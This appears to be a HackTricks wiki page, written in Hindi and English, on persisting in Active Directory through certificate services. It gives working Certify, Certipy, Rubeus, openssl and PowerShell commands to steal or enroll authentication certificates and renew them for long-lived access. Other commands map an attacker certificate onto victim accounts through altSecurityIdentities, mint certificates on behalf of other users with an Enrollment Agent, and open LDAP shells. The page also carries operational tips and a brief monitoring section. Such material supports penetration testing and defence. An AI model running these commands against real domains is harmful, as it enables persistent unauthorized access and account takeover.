# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) से प्राप्त account persistence chapters के उत्कृष्ट research का एक छोटा सारांश है।**<sup>[[7]](#references)</sup>

## Certificates के साथ Active User Credential Theft को समझना – PERSIST1

ऐसी स्थिति में, जहां domain authentication की अनुमति देने वाले certificate का request किसी user द्वारा किया जा सकता है, attacker के पास network पर persistence बनाए रखने के लिए इस certificate को request करने और चुराने का अवसर होता है। डिफ़ॉल्ट रूप से, Active Directory में `User` template ऐसे requests की अनुमति देता है, हालांकि कभी-कभी इसे disabled किया जा सकता है।<sup>[[3]](#references)[[7]](#references)</sup>

[Certify](https://github.com/GhostPack/Certify) या [Certipy](https://github.com/ly4k/Certipy) का उपयोग करके, आप enabled templates को खोज सकते हैं जो client authentication की अनुमति देते हैं और फिर उनमें से एक का request कर सकते हैं:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
एक certificate की शक्ति इस बात में निहित होती है कि वह उस user के रूप में authenticate कर सकता है जिससे वह संबंधित है, password बदलने के बावजूद, जब तक certificate valid रहता है।

आप PEM को PFX में convert करके TGT प्राप्त करने के लिए इसका उपयोग कर सकते हैं:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: अन्य techniques (THEFT sections देखें) के साथ मिलकर, certificate-based auth, LSASS को छुए बिना और non-elevated contexts से भी persistent access की अनुमति देता है।

## Certificates के साथ Machine Persistence प्राप्त करना - PERSIST2

यदि किसी attacker के पास किसी host पर elevated privileges हैं, तो वह default `Machine` template का उपयोग करके compromised system के machine account के लिए certificate enroll कर सकता है। Machine के रूप में authenticate करने से local services के लिए S4U2Self सक्षम होता है और durable host persistence मिल सकती है:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Certificate Renewal के माध्यम से Persistence बढ़ाना - PERSIST3

Certificate templates की validity और renewal periods का दुरुपयोग करने से attacker लंबे समय तक access बनाए रख सकता है। यदि आपके पास पहले से जारी किया गया certificate और उसकी private key है, तो आप expiration से पहले उसे renew करके एक fresh, long-lived credential प्राप्त कर सकते हैं, और original principal से जुड़े अतिरिक्त request artifacts पीछे नहीं छोड़ते।<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: Attacker के पास मौजूद PFX files की lifetimes track करें और उन्हें जल्दी renew करें। Renewal के कारण updated certificates में modern SID mapping extension भी शामिल हो सकता है, जिससे वे अधिक कड़े DC mapping rules के अंतर्गत usable बने रहते हैं (अगले section को देखें)।

## Explicit Certificate Mappings (altSecurityIdentities) स्थापित करना – PERSIST4

यदि आप किसी target account के `altSecurityIdentities` attribute में write कर सकते हैं, तो आप attacker-controlled certificate को उस account से explicitly map कर सकते हैं। यह password changes के बाद भी बना रहता है और, strong mapping formats का उपयोग करने पर, modern DC enforcement के अंतर्गत भी functional रहता है।<sup>[[2]](#references)</sup>

High-level flow:

1. अपने नियंत्रण में client-auth certificate प्राप्त करें या issue करें (जैसे, स्वयं के रूप में `User` template enroll करें)।
2. Certificate से एक strong identifier extract करें (Issuer+Serial, SKI, या SHA1-PublicKey)।
3. उस identifier का उपयोग करके victim principal के `altSecurityIdentities` पर explicit mapping जोड़ें।
4. अपने certificate से authenticate करें; DC explicit mapping के माध्यम से इसे victim से map कर देगा।

Strong Issuer+Serial mapping का उपयोग करते हुए उदाहरण (PowerShell):
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
फिर अपने PFX से authenticate करें। Certipy सीधे एक TGT प्राप्त करेगा:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### मजबूत `altSecurityIdentities` Mappings बनाना

व्यवहार में, attacker के पास मौजूद certificate से **Issuer+Serial** और **SKI** mappings के मजबूत formats बनाना सबसे आसान होता है। यह **11 फरवरी 2025** के बाद महत्वपूर्ण है, जब DCs default रूप से **Full Enforcement** पर होंगे और weak mappings विश्वसनीय नहीं रहेंगी।<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
नोट्स
- केवल strong mapping types का उपयोग करें: `X509IssuerSerialNumber`, `X509SKI`, या `X509SHA1PublicKey`। Weak formats (Subject/Issuer, केवल Subject, RFC822 email) deprecated हैं और DC policy द्वारा block किए जा सकते हैं।
- Mapping **user** और **computer** दोनों objects पर काम करती है, इसलिए computer account के `altSecurityIdentities` पर write access उस machine के रूप में persist करने के लिए पर्याप्त है।
- Cert chain का निर्माण DC द्वारा trusted root तक होना चाहिए। NTAuth में मौजूद Enterprise CAs आमतौर पर trusted होते हैं; कुछ environments public CAs पर भी trust करते हैं।
- Schannel authentication persistence के लिए तब भी उपयोगी रहता है जब PKINIT fail हो जाए, क्योंकि DC में Smart Card Logon EKU नहीं है या वह `KDC_ERR_PADATA_TYPE_NOSUPP` return करता है।

#### 2025+ `Issuer/SID` explicit mappings

**September 9, 2025** के security update से patched **Windows Server 2022+** domain controllers पर Microsoft ने एक और strong explicit mapping format जोड़ा, जो persistence के लिए आकर्षक है क्योंकि यह उसी CA से certificate reissuance के बाद भी बना रहता है:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operationally यह पुराने strong formats से अलग है:
- `Issuer+Serial` **एक exact certificate** को pin करता है।
- `SKI` / `SHA1-PUKEY` **एक keypair** को pin करते हैं।
- `Issuer/SID` **issuing CA + target SID** को pin करता है, इसलिए उसी CA से renewed या reissued certificates काम करते रहते हैं और `altSecurityIdentities` को rewrite करने की आवश्यकता नहीं होती।

Requirements और caveats
- Logon के लिए प्रस्तुत certificate में SID security extension के अंदर वास्तव में target account SID होना चाहिए।
- `ESC9` / `ESC16` style certificates के लिए यह format उपयोगी नहीं है, क्योंकि वे SID extension को omit करते हैं; ऐसे मामलों में `Issuer+Serial`, `SKI`, या `SHA1-PUKEY` का उपयोग करें।

Weak explicit mappings और attack paths के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
domain-escalation.md
{{#endref}}

## Persistence के रूप में Enrollment Agent – PERSIST5

यदि आपको एक valid Certificate Request Agent/Enrollment Agent certificate मिलता है, तो आप users की ओर से नए logon-capable certificates जब चाहें mint कर सकते हैं और agent PFX को persistence token के रूप में offline रख सकते हैं। Abuse workflow:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
इस persistence को समाप्त करने के लिए agent certificate या template permissions का revocation आवश्यक है।

Operational notes
- Modern `Certipy` versions `-on-behalf-of` और `-renew` दोनों को support करते हैं, इसलिए Enrollment Agent PFX रखने वाला attacker original target account को दोबारा छुए बिना leaf certificates mint और बाद में renew कर सकता है।<sup>[[4]](#references)</sup>
- यदि PKINIT-based TGT retrieval संभव नहीं है, तो resulting on-behalf-of certificate फिर भी `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` के साथ Schannel authentication के लिए उपयोग किया जा सकता है।<sup>[[5]](#references)</sup>

## PKINIT Fail होने पर Persisted Certificates का उपयोग

यदि DC के पास Smart Card Logon-capable certificate नहीं है, तो PKINIT के माध्यम से certificate logon `KDC_ERR_PADATA_TYPE_NOSUPP` के साथ fail हो सकता है। इससे persistence primitive समाप्त **नहीं** होता: वही PFX अक्सर Schannel-authenticated LDAP access के लिए अब भी उपयोग किया जा सकता है।<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
यह विशेष रूप से PERSIST4/PERSIST5 के बाद उपयोगी है, क्योंकि आप Linux/macOS से काम जारी रख सकते हैं और अन्य directory persistence actions को chain कर सकते हैं, जैसे [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) डालना या writable delegation attributes को संपादित करना।

## 2025 Strong Certificate Mapping Enforcement: Persistence पर प्रभाव

Microsoft KB5014754 ने domain controllers पर Strong Certificate Mapping Enforcement शुरू किया। **11 फरवरी, 2025** से DCs weak/ambiguous mappings के लिए डिफ़ॉल्ट रूप से **Full Enforcement** पर हैं, और **9 सितंबर, 2025** के security update के बाद patched DCs पुराने Compatibility-mode fallback को support नहीं करते।<sup>[[1]](#references)</sup> व्यावहारिक प्रभाव:

- 2022 से पहले के वे certificates जिनमें SID mapping extension नहीं है, DCs के Full Enforcement में होने पर implicit mapping में fail हो सकते हैं। Attackers AD CS के माध्यम से certificates renew करके (जिससे SID extension प्राप्त हो) या `altSecurityIdentities` में strong explicit mapping डालकर (PERSIST4) access बनाए रख सकते हैं।
- Strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, और modern DCs पर `Issuer/SID`) का उपयोग करने वाली explicit mappings काम करती रहेंगी। Weak formats (Issuer/Subject, Subject-only, RFC822) को block किया जा सकता है और persistence के लिए इनसे बचना चाहिए।
- यदि weak mappings अभी भी काम करती दिखाई दें, तो इसे unpatched या अलग तरह से configured DC मानें, न कि reliable long-term persistence path।
- `ESC9` / `ESC16` शैली के issuance paths SID extension को suppress करते हैं, जिससे `Issuer/SID` unusable हो जाता है। इसलिए fallback strong mappings या normal template के माध्यम से renewal व्यावहारिक persistence विकल्प बनते हैं।

Administrators को इन पर monitor और alert करना चाहिए:
- `altSecurityIdentities` में changes तथा Enrollment Agent और User certificates के issuance/renewals।
- on-behalf-of requests और असामान्य renewal patterns के लिए CA issuance logs।

## References

- [1] [Microsoft Support – KB5014754: Windows domain controllers पर certificate-based authentication में बदलाव](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – जब PKINIT supported न हो, तब certificates के साथ authenticating करना](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – एक नया Issuer/SID AltSecID प्रस्तुत करना](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
